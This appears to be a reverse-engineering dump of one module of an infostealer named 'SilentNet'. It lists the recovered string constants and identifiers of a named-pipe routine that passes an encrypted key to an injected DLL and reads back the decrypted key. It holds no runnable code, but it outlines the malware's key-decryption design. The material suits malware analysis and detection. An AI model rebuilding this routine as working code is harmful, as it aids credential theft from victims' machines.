"""
SilentNet Infostealer - Decompiled Module
Module: .app.util.pipe
Chunk size: 1465 bytes
String constants: 22 unicode, 87 identifiers

# Named pipe IPC with injected DLL
# Original path: app/util/pipe.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

'\\\\.\\pipe\\'
# identifier: kernel32
# identifier: CreateNamedPipeW
# identifier: PIPE_ACCESS_DUPLEX
# identifier: PIPE_TYPE_BYTE
# identifier: PIPE_READMODE_BYTE
# identifier: PIPE_WAIT
# identifier: INVALID_HANDLE_VALUE
# identifier: GetLastError
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'CreateNamedPipe failed'
# identifier: LogType
# identifier: ERROR
'error='
'Pipe created'
# identifier: DEBUG
'name='
# identifier: HANDLE
'Create a named pipe for communication with injected DLL.'
# identifier: threading
# identifier: result
# identifier: error
# identifier: pipe_operation
'decrypt_key.<locals>.pipe_operation'
# identifier: Thread
# identifier: target
# identifier: start
# identifier: join
# identifier: timeout
# identifier: is_alive
'Pipe operation timeout'
'timeout='
# identifier: ms
# identifier: error
'Pipe operation failed'
# identifier: result
'Send encrypted key to DLL via pipe and receive decrypted key.'
# identifier: struct
# identifier: pack
'<I'
# identifier: encrypted_key
# identifier: ConnectNamedPipe
# identifier: pipe
# identifier: ERROR_PIPE_CONNECTED
'ConnectNamedPipe error='
# identifier: result_holder
# identifier: DWORD
# identifier: WriteFile
# identifier: byref
'WriteFile error='
'Key sent'
'bytes='
# identifier: value
# identifier: create_string_buffer
# identifier: ReadFile
'ReadFile error='
# identifier: raw
# identifier: decode
# identifier: ascii
# identifier: strip
'Key received'
'len='
# identifier: CloseHandle
'Close a named pipe handle.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: ctypes
# identifier: wintypes
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: windll
# identifier: name
# identifier: return
# identifier: setup_pipe
# identifier: timeout_ms
# identifier: decrypt_key
# identifier: close_pipe
'app\\util\\pipe.py'
'<module app.util.pipe>'
# identifier: pipe
# identifier: pipe
# identifier: encrypted_key
# identifier: timeout_ms
# identifier: threading
# identifier: result_holder
# identifier: pipe_operation
# identifier: connected
# identifier: error
# identifier: bytes_written
# identifier: success
# identifier: recv_buf
# identifier: bytes_read
# identifier: pipe
# identifier: result_holder
# identifier: encrypted_key
# identifier: pipe
# identifier: result_holder
# identifier: name
# identifier: pipe_name
# identifier: pipe
# identifier: error
# identifier: __spec__
